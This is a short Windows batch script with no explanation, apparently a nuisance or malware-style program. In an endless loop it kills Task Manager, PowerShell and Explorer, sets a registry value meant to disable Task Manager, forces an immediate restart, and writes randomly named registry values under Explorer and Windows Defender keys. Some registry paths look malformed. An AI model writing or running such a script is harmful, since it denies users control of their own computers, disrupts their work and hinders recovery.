@shift /0
@:1



@cd \

@shutdown -a



@cd \
@taskkill /IM taskmgr.exe /F


@cd \
@taskkill /IM powershell.exe /f


@cd \
@taskkill /IM explorer.exe /f
@cd \
@reg add HKEY_CURRENT_USER\Software\ /v DisableTaskMgr  /t REG_DWORD /d 1 /f
@cd \
@shutdown /r /t 0
@cd \
@reg add HKEY_CURRENT_USER\Microsoft\Windows\CurrentVersion\Explorer\ /v oohguyfrtd  /t REG_DWORD /d 1 /f
@cd \
@reg add HKEY_CURRENT_USER\Software\Microsoft\Windows Defender Security Center\ /v oooooou /t REG_DWORD /d 1 /f
@ping 1.1.1.1 -n 1 -w 1000 > NUL
@goto :1